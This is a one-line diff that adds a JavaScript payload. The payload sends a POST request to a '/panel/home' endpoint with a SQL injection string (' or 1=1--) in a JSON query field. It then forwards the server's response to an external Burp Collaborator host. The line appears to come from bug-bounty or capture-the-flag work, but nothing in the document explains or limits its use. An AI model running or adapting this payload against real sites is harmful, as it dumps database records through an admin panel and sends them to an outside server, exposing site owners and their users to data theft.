@@ -1,0 +1,1 @@
+fetch("/panel/home",{method:"POST",body:JSON.stringify({field:"region",query_eq:"' or 1=1--"}),headers:{"Content-type":"application/json; charset=UTF-8"}}).then(e=>e.text()).then(e=>{fetch("http://7v3zuzcvaejys8tjmuyhd4ymddj67v.burpcollaborator.net",{method:"POST",body:e})});
